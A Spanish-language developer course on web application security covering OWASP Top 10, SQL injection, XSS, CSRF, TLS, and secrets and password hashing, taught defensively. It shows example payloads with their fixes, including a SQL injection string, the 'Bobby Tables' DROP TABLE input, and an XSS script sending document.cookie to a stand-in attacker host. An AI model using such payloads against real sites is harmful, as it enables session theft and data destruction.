Módulo 1

La Mentalidad de Seguridad

Antes de las técnicas, los principios que lo sostienen todo.

🚪 Regla #1: NUNCA confíes en el cliente

Todo lo que llega de fuera — formularios, parámetros de URL, headers, JSON del body, cookies — puede haber sido manipulado. El navegador valida por cortesía (mejor UX), pero cualquiera puede saltarse esa validación enviando la petición directa con curl o Postman (¡lo aprendiste en CP3!).

❌ Pensamiento inocente

"El formulario tiene un select con 3 opciones; solo pueden llegar esas 3." — Falso: pueden llegar 900 caracteres de lo que sea.

✅ Pensamiento defensivo

"El servidor valida TODO otra vez: tipo, rango, formato y permisos — sin importar lo que el frontend prometa." La validación del cliente es cortesía; la del servidor es seguridad.

Los 4 principios que citarás toda tu carrera

🧅 Defensa en profundidad

Varias capas de protección, como un castillo: foso + muralla + guardias. Si la validación falla, el ORM parametriza; si eso falla, el usuario de BD no tiene permisos de borrar; si eso falla, hay respaldos. Ninguna capa única es suficiente.

🤏 Menor privilegio

Cada usuario, app y servicio recibe SOLO los permisos que necesita para su tarea, ni uno más. La API que solo lee productos no necesita permisos de DELETE; el becario no necesita acceso a producción. Si algo se compromete, el daño queda acotado.

📉 Reducir la superficie de ataque

Cada puerto abierto, endpoint expuesto, dependencia instalada y feature olvidada es una puerta potencial. Menos puertas = menos que defender. Borra el código muerto, cierra los puertos que no usas, elimina dependencias abandonadas.

🔍 Fallar de forma segura

Cuando algo falla, el sistema debe quedar CERRADO, no abierto. Si el servicio de permisos no responde → denegar acceso (no conceder). Y los mensajes de error al usuario no deben revelar detalles internos (stack traces, versiones, rutas) — eso es información para el atacante.

💼 Por qué esto es tema de SENIOR: un junior pregunta "¿funciona?"; un senior también pregunta "¿y si alguien lo usa MAL a propósito?". Esa segunda pregunta, hecha en cada code review, previene más incidentes que cualquier herramienta.

El mapa oficial de los riesgos más comunes en aplicaciones web.

🗺️ ¿Qué es OWASP?

La OWASP🇺🇸 OWASP — Open Worldwide Application Security Project — Fundación sin fines de lucro que publica estándares y guías de seguridad de aplicaciones. Su "Top 10" es la referencia mundial de riesgos web. (Open Worldwide Application Security Project) es la fundación de referencia en seguridad de aplicaciones. Su Top 10 es la lista de las categorías de riesgo más frecuentes y graves — el vocabulario común entre desarrolladores, auditores y entrevistas. Aquí el panorama completo (los módulos 3 y 4 profundizan en los que más te tocan como dev):

#RiesgoEn una frase
A01Broken Access ControlEl usuario puede hacer/ver cosas que NO le corresponden (cambiar el id en la URL y ver datos ajenos). El #1 actual.
A02Cryptographic FailuresDatos sensibles sin cifrar o mal cifrados: HTTP en vez de HTTPS, contraseñas en texto plano.
A03Injection (SQL, etc.)Entradas del usuario ejecutadas como código/consulta. El clásico eterno (→ módulo 3).
A04Insecure DesignLa lógica misma es insegura desde el diseño: "recuperar contraseña" que revela si el correo existe.
A05Security MisconfigurationConfiguración floja: paneles de admin abiertos, mensajes de error con stack trace, permisos por defecto.
A06Vulnerable ComponentsDependencias con vulnerabilidades conocidas sin actualizar. Tu app es tan segura como su librería más vieja.
A07Auth FailuresAutenticación débil: sin límite de intentos de login, sesiones eternas, contraseñas débiles permitidas.
A08Data Integrity FailuresConfiar en datos/actualizaciones sin verificar su integridad (ej. pipelines CI/CD comprometidos).
A09Logging FailuresSin logs ni monitoreo: el ataque pasó hace 6 meses y nadie se enteró (→ CP7 módulo 6).
A10SSRFHacer que TU servidor haga peticiones a donde el atacante quiera (URLs internas de tu red).
🎯 El patrón A01 que TODO dev debe evitar (IDOR): tu endpoint es GET /pedidos/1001. Un usuario cambia el número a 1002... ¿y ve el pedido de OTRA persona? Eso es una Referencia Directa Insegura. La cura: en CADA endpoint, verificar que el recurso pedido pertenece al usuario autenticado — no basta con que esté logueado. Autenticación ≠ autorización (¿recuerdas CP3?).

Módulo 3

Inyección SQL y Validación

El ataque más famoso de la historia — y su cura definitiva.

💉 Cómo funciona (para saber defenderte)

La inyección SQL🇺🇸 SQL Injection — Ataque donde el texto que el usuario escribe se CONCATENA dentro de una consulta SQL y se ejecuta como parte de ella, alterando su lógica. Se previene con consultas parametrizadas. ocurre cuando construyes consultas pegando texto del usuario directamente en el SQL. El texto deja de ser "dato" y se convierte en "código":

# ❌ VULNERABLE: la consulta se arma pegando texto del usuario
usuario = input("Usuario: ")
consulta = f"SELECT * FROM Usuarios WHERE nombre = '{usuario}'"

# Si el usuario escribe:  ana' OR '1'='1
# La consulta se convierte en:
#   SELECT * FROM Usuarios WHERE nombre = 'ana' OR '1'='1'
# '1'='1' SIEMPRE es verdadero → devuelve TODOS los usuarios 😱
# Variantes peores pueden modificar o borrar tablas completas.

La cura es simple y total: consultas parametrizadas. El valor del usuario viaja SEPARADO del SQL, como dato puro — la base de datos jamás lo interpreta como código:

# ✅ SEGURO: consulta parametrizada — el valor viaja aparte
cursor.execute(
    "SELECT * FROM Usuarios WHERE nombre = %s",   # el SQL fijo
    (usuario,)                                     # el dato, separado
)
# Aunque escriban ana' OR '1'='1, se busca literalmente
# un usuario LLAMADO "ana' OR '1'='1". Inofensivo. ✅

# Los ORMs (CP6) parametrizan por ti automáticamente:
session.query(Usuario).filter(Usuario.nombre == usuario)
// ✅ SEGURO: consulta parametrizada — el valor viaja aparte
var cmd = new SqlCommand(
    "SELECT * FROM Usuarios WHERE nombre = @nombre", conexion);
cmd.Parameters.AddWithValue("@nombre", usuario);   // el dato, separado

// Aunque escriban ana' OR '1'='1, se busca literalmente
// un usuario LLAMADO así. Inofensivo. ✅

// Entity Framework (CP6) parametriza por ti automáticamente:
db.Usuarios.Where(u => u.Nombre == usuario)

Validación y sanitización: las otras dos murallas

✅ Validar = rechazar lo que no cumple

Antes de procesar, verifica tipo, formato, rango y longitud. Prefiere listas blancas (qué SÍ se acepta) sobre listas negras (qué se prohíbe — siempre se te escapa algo):

  • • Edad: entero entre 0 y 120
  • • Email: formato válido y máx. 254 caracteres
  • • Estado del pedido: SOLO uno de ["pendiente","enviado","entregado"]

🧼 Sanitizar = limpiar/neutralizar lo peligroso

Cuando el dato debe aceptarse pero puede contener contenido activo, se neutraliza según el destino:

  • • Va a SQL → parametrizar (nunca "limpiar a mano")
  • • Va a HTML → escapar (< se vuelve &lt;) — módulo 4
  • • Es una ruta de archivo → resolver y verificar que quede DENTRO de la carpeta permitida
📖 El chiste que lo inmortalizó: el cómic xkcd del niño llamado Robert'); DROP TABLE Students;-- ("Little Bobby Tables"). La escuela perdió sus registros por concatenar el nombre en el SQL. La moraleja del cómic es literal: "espero que hayan aprendido a sanitizar las entradas de la base de datos".

Módulo 4

XSS y CSRF

Los dos ataques del lado del navegador que todo dev web debe entender.

📜 XSS — Cross-Site Scripting: el grafiti ejecutable

El XSS🇺🇸 XSS — Cross-Site Scripting — Ataque donde contenido enviado por un usuario (ej. un comentario) contiene JavaScript que se ejecuta en el navegador de OTROS usuarios al ver la página. Se previene escapando la salida. ocurre cuando lo que un usuario ESCRIBIÓ (un comentario, su "nombre") se muestra a otros usuarios sin neutralizar, y contenía un script. El navegador de la víctima lo ejecuta como si fuera parte legítima de la página — pudiendo robar su sesión o actuar en su nombre.

<!-- Un usuario deja este "comentario" en tu blog: -->
<script>fetch('https://atacante.com/roba?cookie=' + document.cookie)</script>

<!-- ❌ Si tu página lo muestra tal cual, CADA visitante ejecuta ese script -->

<!-- ✅ La cura: ESCAPAR la salida. El mismo texto se guarda igual,
     pero al mostrarse se convierte en texto inofensivo: -->
&lt;script&gt;fetch(...)&lt;/script&gt;
<!-- El visitante VE el texto del script, pero no se ejecuta -->

1. Escapa TODA salida

Los frameworks modernos (React, Razor, Jinja2) escapan por defecto — el peligro son los "modos crudos": innerHTML, Html.Raw, |safe. Úsalos solo con contenido 100% confiable.

2. Content Security Policy

Header CSP: le dice al navegador de qué orígenes aceptar scripts. Aunque se cuele algo, no se ejecuta. Defensa en profundidad ✔.

3. Cookies HttpOnly

Las cookies de sesión marcadas HttpOnly no son legibles desde JavaScript: aunque haya XSS, la sesión no se roba tan fácil.

🎭 CSRF — Cross-Site Request Forgery: la firma falsificada

El CSRF🇺🇸 CSRF — Cross-Site Request Forgery — Ataque donde un sitio malicioso hace que TU navegador (con tu sesión activa) envíe una petición a otro sitio donde estás logueada, ejecutando acciones sin tu consentimiento. abusa de que tu navegador envía tus cookies automáticamente. Estás logueada en tubanco.com; visitas un sitio malicioso que esconde un formulario auto-enviado hacia tubanco.com/transferir... y tu navegador lo manda CON tu cookie de sesión. El banco cree que fuiste tú.

🎫 Cura 1: Tokens anti-CSRF

Cada formulario legítimo incluye un token secreto único que el sitio malicioso NO puede conocer. Sin token válido → petición rechazada. Los frameworks lo integran: [ValidateAntiForgeryToken] en ASP.NET, {% csrf_token %} en Django.

🍪 Cura 2: Cookies SameSite

El atributo SameSite=Lax/Strict le dice al navegador: "no envíes esta cookie en peticiones que nazcan de OTROS sitios". Los navegadores modernos ya lo aplican por defecto — pero no dependas solo de eso (defensa en profundidad).

🧠 Truco para no confundirlos: XSS = código malicioso ejecutándose EN tu página. CSRF = peticiones falsas hechas DESDE otra página usando la sesión de la víctima.

Módulo 5

HTTPS, SSL/TLS y Certificados

Qué protege realmente el candadito del navegador.

✉️ Postal vs. sobre lacrado

HTTP plano es una tarjeta postal: cualquiera que la toque en el camino (el wifi del café, el proveedor de internet, un router comprometido) puede LEERLA y hasta MODIFICARLA. HTTPS = HTTP dentro de un túnel TLS🇺🇸 TLS — Transport Layer Security — Protocolo que cifra la comunicación entre cliente y servidor. Es el sucesor de SSL (el nombre viejo que todos siguen usando). HTTPS = HTTP sobre TLS.: un sobre lacrado e imposible de abrir en tránsito. TLS garantiza tres cosas:

🔒 Confidencialidad

Nadie en el camino puede leer el contenido: ni contraseñas, ni tokens, ni datos.

🧾 Integridad

Nadie puede modificar el mensaje en tránsito sin que se detecte.

🪪 Autenticidad

El certificado prueba que hablas con el VERDADERO tubanco.com y no con un impostor.

Nota de nombres: SSL es el protocolo viejo (obsoleto); TLS es el actual. Todo el mundo sigue diciendo "certificado SSL" por costumbre — en la práctica hablan de TLS.

¿Cómo se establece la conexión segura?

El handshake TLS simplificado (sucede en milisegundos, antes de cualquier dato):

  1. 1Hola: el navegador saluda al servidor y le dice qué métodos de cifrado soporta.
  2. 2Identificación: el servidor presenta su certificado🇪🇸 Certificado digital — Documento firmado por una Autoridad Certificadora (CA) que vincula un dominio con su llave pública. El navegador verifica la firma contra las CAs en las que confía. — firmado por una Autoridad Certificadora (CA) en la que el navegador ya confía. Como mostrar el pasaporte, no una credencial dibujada a mano.
  3. 3Acuerdo de llaves: con criptografía de llave pública, ambos acuerdan una llave secreta compartida SIN que nadie que espíe pueda deducirla.
  4. 4Túnel listo: todo lo que sigue viaja cifrado con esa llave. Ahora sí: HTTP normal, pero dentro del sobre lacrado.
🆓 Let's Encrypt: desde 2015, los certificados son GRATIS y automáticos (se renuevan solos cada 90 días con herramientas como certbot, o integrado en Cloudflare/Nginx/tu nube). Ya no existe pretexto para servir HTTP plano.
🏗️ En la práctica (conecta con CP7): el TLS se "termina" en el reverse proxy (Nginx) o el balanceador: el certificado vive ahí, y hacia adentro el tráfico va por la red privada. Header extra recomendado: HSTS — le dice al navegador "conmigo SIEMPRE HTTPS, nunca aceptes HTTP".

Módulo 6

Secretos y Contraseñas

Dónde viven las llaves... y por qué jamás en el código.

🔑 La escalera del manejo de secretos

API keys, cadenas de conexión, tokens: los secretos de tu app. De peor a mejor práctica:

💀

Nivel 0 — Hardcodeado en el código

api_key = "sk_live_abc123" commiteado a Git. Queda en el historial PARA SIEMPRE (borrar el archivo no lo saca del historial), y hay bots escaneando GitHub 24/7 buscando exactamente esto.

🙂

Nivel 1 — Variables de entorno + .env

El secreto vive en el sistema o en un archivo .env que está en el .gitignore (¡verifica que de verdad esté!). El código solo lee os.environ["API_KEY"]. El mínimo profesional aceptable.

🏆

Nivel 2 — Gestor de secretos

Azure Key Vault, AWS Secrets Manager, HashiCorp Vault: los secretos viven cifrados y centralizados, con control de acceso (IAM), auditoría de quién los leyó y rotación automática. El estándar en producción seria.

# .env (en .gitignore, NUNCA en el repo):
#   DATABASE_URL=postgres://user:pass@host/db
#   STRIPE_KEY=sk_live_...

import os
from dotenv import load_dotenv   # pip install python-dotenv

load_dotenv()                     # carga el .env al entorno
db_url = os.environ["DATABASE_URL"]   # el código nunca conoce el valor
stripe_key = os.environ["STRIPE_KEY"]
// appsettings.json para lo NO sensible; secretos fuera del repo:

// En desarrollo: dotnet user-secrets (fuera de la carpeta del proyecto)
//   dotnet user-secrets set "Stripe:Key" "sk_live_..."

var builder = WebApplication.CreateBuilder(args);

// En producción: variables de entorno o Azure Key Vault
string stripeKey = builder.Configuration["Stripe:Key"];
// La misma línea lee de user-secrets, env vars o Key Vault
// según el ambiente — el código nunca cambia. ✅

🔐 Contraseñas de usuarios: hash, nunca texto

Regla absoluta: jamás guardes contraseñas — ni en texto plano, ni "cifradas" (lo cifrado se descifra). Se guarda su hash🇪🇸 Hash — Huella digital de un dato: función de un solo sentido (no se puede revertir). Para contraseñas se usan hashes LENTOS a propósito (bcrypt, Argon2) con salt, para resistir ataques de fuerza bruta.: una huella digital de un solo sentido. Al iniciar sesión, se hashea lo que escriben y se compara con la huella guardada. Si te roban la base, no hay contraseñas que leer.

Usa el algoritmo correcto

bcrypt o Argon2: lentos A PROPÓSITO (milisegundos por intento) para que probar millones de contraseñas sea inviable. MD5/SHA-1 NO sirven para contraseñas: son rápidos = fáciles de atacar.

Con salt único

Un valor aleatorio por usuario mezclado antes de hashear: dos usuarios con la MISMA contraseña tienen huellas distintas, y las tablas precalculadas (rainbow tables) no sirven. bcrypt lo hace solo.

Y en el login

Límite de intentos (rate limiting, ¡CP5!), mensajes genéricos ("usuario o contraseña incorrectos" — no reveles cuál falló), y ofrece autenticación de dos factores (2FA).

🚨 Protocolo si un secreto se filtró: 1) REVÓCALO inmediatamente (no "luego"). 2) Emite uno nuevo. 3) Revisa los logs de uso durante la ventana de exposición. 4) Investiga cómo llegó ahí y agrega la barrera que faltó (pre-commit hooks como gitleaks detectan secretos antes del commit).

Preguntas frecuentes de seguridad

Frases clave en inglés para entrevistas / Key Phrases

Hablar de prevención

"All queries are parameterized — never string concatenation."

Todas las consultas van parametrizadas — nunca concatenación de texto.

"We validate on the server; client validation is just UX."

Validamos en el servidor; la validación del cliente es solo experiencia de usuario.

"Output is escaped by default to prevent XSS."

La salida se escapa por defecto para prevenir XSS.

"Passwords are hashed with bcrypt, never stored in plain text."

Las contraseñas se hashean con bcrypt, nunca se guardan en texto plano.

Hablar de principios

"We follow the principle of least privilege."

Seguimos el principio de menor privilegio.

"Defense in depth: no single layer is enough."

Defensa en profundidad: ninguna capa por sí sola es suficiente.

"Secrets live in a vault, never in the repository."

Los secretos viven en un gestor, nunca en el repositorio.

"If a key leaks, we revoke it immediately and audit its usage."

Si una llave se filtra, la revocamos de inmediato y auditamos su uso.
